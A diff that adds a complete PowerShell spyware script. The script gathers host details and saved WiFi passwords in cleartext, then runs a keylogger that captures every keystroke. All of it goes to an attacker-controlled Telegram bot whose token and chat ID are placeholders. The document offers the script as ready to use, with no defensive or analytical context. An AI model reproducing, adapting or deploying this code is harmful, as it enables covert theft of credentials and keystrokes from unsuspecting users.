@@ -1,0 +1,161 @@
+# Telegram Bot Token and Chat ID
+$telegramToken = "<TOKEN>"  # Replace <TOKEN> with your bot's token
+$chatId = "<CHAT_ID>"       # Replace <CHAT_ID> with your Chat ID
+
+# Function to send message to Telegram
+function Send-TelegramMessage {
+    param (
+        [string]$message
+    )
+
+
+
+
+    $url = "https://api.telegram.org/bot$telegramToken/sendMessage"
+    $body = @{ chat_id = $chatId; text = $message } | ConvertTo-Json -Depth 10
+
+
+
+
+    try {
+        Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body $body
+    } catch {
+        Write-Host "Error sending message: $_"
+    }
+}
+
+# --- Collect System Information ---
+$systemInfo = @{
+    "PC Name" = $env:COMPUTERNAME
+    "Username" = $env:USERNAME
+    "OS" = [string]((Get-WmiObject -Class Win32_OperatingSystem).Caption).Trim()
+    "Architecture" = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
+    "CPU" = (Get-CimInstance Win32_Processor).Name
+    "GPU" = (Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Caption -First 1)
+    "RAM" = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2).ToString() + " GB"
+    "Internal IP" = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" } | Select-Object -ExpandProperty IPAddress -First 1)
+    "External IP" = (Invoke-RestMethod -Uri "http://ifconfig.me")
+}
+
+# --- Collect WiFi Information ---
+try {
+    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() }
+
+
+
+
+    if ($wifiProfiles) {
+        $wifiDetails = $wifiProfiles | ForEach-Object {
+            $wifiName = $_
+            $wifiKey = (netsh wlan show profile name="$wifiName" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ": ")[1].Trim() })
+            if ($wifiKey) {
+                "$wifiName (Password: $wifiKey)"
+            } else {
+                "$wifiName (Password: Not Saved)"
+            }
+        }
+        $systemInfo["WiFi"] = ($wifiDetails | Sort-Object | Get-Unique) -join "`n"
+    } else {
+        $systemInfo["WiFi"] = "No WiFi connections found"
+    }
+} catch {
+    $systemInfo["WiFi"] = "Error retrieving WiFi details"
+}
+
+# --- Format System Info Message for Telegram ---
+$systemMessage = @"
+System Information Report:
+PC Name: $($systemInfo['PC Name'])
+Username: $($systemInfo['Username'])
+OS: $($systemInfo['OS'])
+Architecture: $($systemInfo['Architecture'])
+CPU: $($systemInfo['CPU'])
+GPU: $($systemInfo['GPU'])
+RAM: $($systemInfo['RAM'])
+Internal IP: $($systemInfo['Internal IP'])
+External IP: $($systemInfo['External IP'])
+WiFi:
+$($systemInfo['WiFi'])
+"@
+Send-TelegramMessage -message $systemMessage
+
+# Keylogger: Add Filtering and Duplicate Prevention
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WinAPI {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+
+# Storage for Current Key States
+$pressedKeys = @{}
+$keyBuffer = ""
+$lastKeyTime = Get-Date
+$bufferLimit = 50
+$sendDelay = 1 # Seconds
+
+# Mapping Special Keys
+$specialKeys = @{
+    8 = "[Backspace]"
+    9 = "[Tab]"
+    13 = "[Enter]"
+    16 = "[Shift]"
+    17 = "[Ctrl]"
+    18 = "[Alt]"
+    27 = "[Escape]"
+    32 = " "  # Space
+    37 = "[Left]"
+    38 = "[Up]"
+    39 = "[Right]"
+    40 = "[Down]"
+}
+
+# Function to Send Keylogs
+function Send-KeyLog {
+    param ($log)
+    $keylogMessage = "Keylogger Report:
+$log"
+    Send-TelegramMessage -message $keylogMessage
+}
+
+# Main Keylogger Loop
+while ($true) {
+    Start-Sleep -Milliseconds 50
+    $currentTime = Get-Date
+    foreach ($key in 1..255) {
+        $state = [WinAPI]::GetAsyncKeyState($key)
+        if ($state -ne 0) {
+            if (-not $pressedKeys.ContainsKey($key)) {
+                # Process Only New Keypresses
+                if ($specialKeys.ContainsKey($key)) {
+                    $keyBuffer += $specialKeys[$key]
+                } elseif (($key -ge 65 -and $key -le 90) -or ($key -ge 48 -and $key -le 57)) {
+                    $keyBuffer += [char]$key
+                } else {
+                    $keyBuffer += "[KEY_$key]"
+                }
+                $pressedKeys[$key] = $true
+                $lastKeyTime = Get-Date
+            }
+        } else {
+            # Remove Key if Released
+            if ($pressedKeys.ContainsKey($key)) {
+                $pressedKeys.Remove($key)
+            }
+        }
+    }
+
+    # Send Buffer if Limit Reached
+    if ($keyBuffer.Length -ge $bufferLimit) {
+        Send-KeyLog -log $keyBuffer
+        $keyBuffer = ""
+    }
+
+    # Send by Timer
+    if ((New-TimeSpan -Start $lastKeyTime -End $currentTime).TotalSeconds -ge $sendDelay -and $keyBuffer.Length -gt 0) {
+        Send-KeyLog -log $keyBuffer
+        $keyBuffer = ""
+    }
+}
